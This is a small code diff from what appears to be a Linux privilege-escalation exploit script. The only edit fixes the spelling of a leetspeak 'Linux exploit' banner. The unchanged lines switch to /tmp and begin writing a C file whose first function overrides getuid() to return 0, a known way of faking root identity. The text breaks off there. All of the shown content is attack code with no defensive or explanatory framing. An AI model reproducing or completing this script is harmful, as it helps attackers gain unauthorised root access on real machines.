@@ -1,4 +1,4 @@
-echo L377 l1NUx 3xPl107
+echo L337 l1NUx 3xPl107
 cd /tmp/
 cat > ex.c << EOF
 int getuid(){return 0;}
